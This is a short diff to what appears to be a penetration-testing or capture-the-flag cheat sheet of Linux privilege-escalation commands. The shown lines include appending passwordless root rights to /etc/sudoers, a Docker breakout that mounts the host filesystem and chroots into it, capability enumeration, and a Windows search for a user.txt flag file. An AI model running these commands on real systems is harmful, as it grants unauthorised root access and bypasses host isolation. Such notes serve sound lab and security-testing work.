@@ -150,7 +150,7 @@ getcap -r / 2>/dev/null
 
 echo "user ALL=(ALL:ALL) ALL" >> /etc/sudoers;
 
-echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers;
+echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers; 
 
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
@@ -159,3 +159,5 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 searchsploit -m file
 
 ssh user@{rhost} -t "bash --noprofile"
+
+where /r c: *user.txt*
